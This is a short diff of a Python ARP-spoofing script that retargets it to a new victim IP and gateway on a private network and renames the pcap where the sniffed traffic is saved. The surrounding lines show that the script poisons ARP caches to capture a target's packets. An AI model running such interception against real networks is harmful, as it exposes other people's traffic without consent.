@@ -51,8 +51,8 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     return
 
 interface       = "eth0"
-target_ip       = "192.168.0.39"
-gateway_ip      = "192.168.0.1"
+target_ip       = "192.168.100.60"
+gateway_ip      = "192.168.100.1"
 packet_count    = 1000
 
 # set our interface
@@ -90,7 +90,7 @@ try:
     packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
 
     # write out captured packets
-    wrpcap('arper.pcap', packets)
+    wrpcap('arper3.pcap', packets)
 
     # restore the network
     restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
